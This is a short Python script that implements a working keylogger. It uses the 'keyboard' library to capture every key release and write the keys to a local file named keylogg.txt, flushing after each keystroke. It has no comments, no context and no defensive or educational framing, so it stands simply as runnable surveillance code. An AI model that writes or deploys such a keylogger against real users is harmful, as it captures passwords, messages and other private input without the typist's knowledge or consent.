import keyboard

class keylogger():
    def __init__(self):
        self.f=open("keylogg.txt",'w')
    def start_log(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()
    def callback(self,event):
        button=event.name
        if button=="space":
            self.f.write(" ")
        elif button=="enter":
            self.f.write("\n")
        else:
            self.f.write(button)
        self.f.flush()

keylogger_object=keylogger()
keylogger_object.start_log()